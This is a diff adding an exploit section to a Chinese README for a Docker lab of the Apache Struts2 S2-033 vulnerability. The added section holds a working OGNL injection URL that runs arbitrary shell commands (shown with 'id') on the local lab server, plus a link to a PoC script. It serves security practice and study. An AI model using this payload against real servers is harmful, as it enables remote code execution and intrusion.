@@ -26,3 +26,19 @@ $ docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-033
 ### 使用与利用
 
 访问 `http://你的 IP 地址:端口号/`
+
+#### Exp
+
+假定启动后的地址为：http://127.0.0.1:8080/
+
+执行 id 命令：
+
+```
+http://127.0.0.1:8080/orders/4/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=id
+```
+
+> 修改参数 command 的值为你要执行的命令
+
+### 参考链接
+
+![S2-033_CmdToolExP - coffeehb/Some-PoC-oR-ExP](https://github.com/coffeehb/Some-PoC-oR-ExP/blob/master/Struts2/S2-033_CmdToolExP.py)
